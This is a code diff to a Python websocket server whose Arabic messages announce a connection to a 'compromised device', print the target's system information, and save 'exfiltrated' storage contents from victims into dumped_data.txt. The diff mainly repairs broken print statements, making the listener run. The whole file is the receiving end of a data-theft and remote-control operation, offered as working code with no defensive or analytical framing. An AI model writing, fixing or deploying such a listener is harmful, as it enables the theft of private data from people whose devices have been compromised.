@@ -3,7 +3,7 @@ import websockets
 import json
 
 async def handler(websocket, path):
-    print(incoming := "[+] تم الاتصال بالجهاز المكسور بنجاح!")
+    print("[+] تم الاتصال بالجهاز المكسور بنجاح!")
     async for message in websocket:
         try:
             data = json.loads(message)
@@ -12,8 +12,7 @@ async def handler(websocket, path):
             if action == 'system_info':
                 print(f"[+] معلومات النظام المستهدف: {data.get('ua')}")
             elif action == 'file_dump':
-                print([+] تم استقبال محتوى تخزين بنجاح!)
-                # حفظ البيانات المستخرجة في ملف نصي تلقائياً
+                print("[+] تم استقبال محتوى تخزين بنجاح!")
                 with open("dumped_data.txt", "w", encoding="utf-8") as f:
                     f.write(data.get('content'))
                 print("[✔] تم حفظ البيانات المسحوبة في ملف: dumped_data.txt")
